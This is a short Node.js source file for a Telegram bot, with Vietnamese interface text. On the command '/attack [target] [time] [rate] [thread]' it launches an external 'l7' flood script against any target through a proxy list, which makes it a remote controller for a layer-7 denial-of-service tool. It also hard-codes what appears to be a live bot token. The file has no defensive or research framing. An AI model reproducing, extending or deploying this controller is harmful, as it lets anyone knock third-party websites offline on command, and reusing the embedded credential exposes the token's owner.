const TelegramBot = require('node-telegram-bot-api')
const { spawn } = require('child_process')
const express = require('express')

const bot = new TelegramBot('7937745403:AAGBsPZIbCTzvhYhsOFkL-IVAQc3m-ta-Dc', { polling: true })

const app = express()
const PORT = process.env.PORT || 3000

app.get('/', (req, res) => {
  res.send('Bot hoạt động!')
})

app.listen(PORT, () => {
  console.log(`Server đang chạy tại cổng ${PORT}`)
})

bot.onText(/^\/attack (.+)/, (msg, match) => {
  const chatId = msg.chat.id
  const args = match[1].split(' ')

  if (args.length !== 4) {
    bot.sendMessage(chatId, '❌ Dùng: /attack [target] [time] [rate] [thread]')
    return
  }

  const [target, time, rate, thread] = args
  const command = spawn('node', ['l7', target, time, rate, thread, 'proxy.txt'])

  const info = {
    target: target,
    time: time,
    rate: rate,
    thread: thread,
    proxy: 'proxy.txt'
  }

  const message = `Attack Started!\n➖➖➖➖➖➖➖➖➖➖\n\`\`\`json\n${JSON.stringify(info, null, 2)}\n\`\`\``

  bot.sendMessage(chatId, message, { parse_mode: 'Markdown' })

  console.log(`[ATTACK] Target: ${target} | Time: ${time}s | Rate: ${rate} | Thread: ${thread}`)
})
